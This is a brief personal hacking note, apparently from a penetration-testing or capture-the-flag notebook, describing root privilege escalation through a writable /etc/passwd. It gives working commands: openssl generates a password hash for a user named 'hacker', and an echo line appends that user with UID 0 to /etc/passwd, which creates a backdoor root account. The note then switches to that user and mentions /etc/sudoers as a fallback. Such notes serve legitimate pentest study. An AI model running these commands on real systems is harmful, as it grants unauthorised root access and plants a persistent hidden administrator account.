we may need SALTS if we are able to modify /etc/passwd
	`openssl passwd -1 -salt <user> <password>


example
	Hash password for new user
		`openssl passwd -1 -salt hacker pwned1337!
			`$1$hacker$1wrOUaThCQb73mxBAbaba0
	Modify /etc/passwd
		add new user as a root user
		`echo "hacker:$1$hacker$1wrOUaThCQb73mxBAbaba0:0:0:root:/root:/bin/bash" >> /etc/passwd
	Verify it saved correctly
		cat /etc/passwd
	Switch to user
		`su hacker`


IF this fails , see if you are able to modify /etc/sudoers...
	see my notes page on that...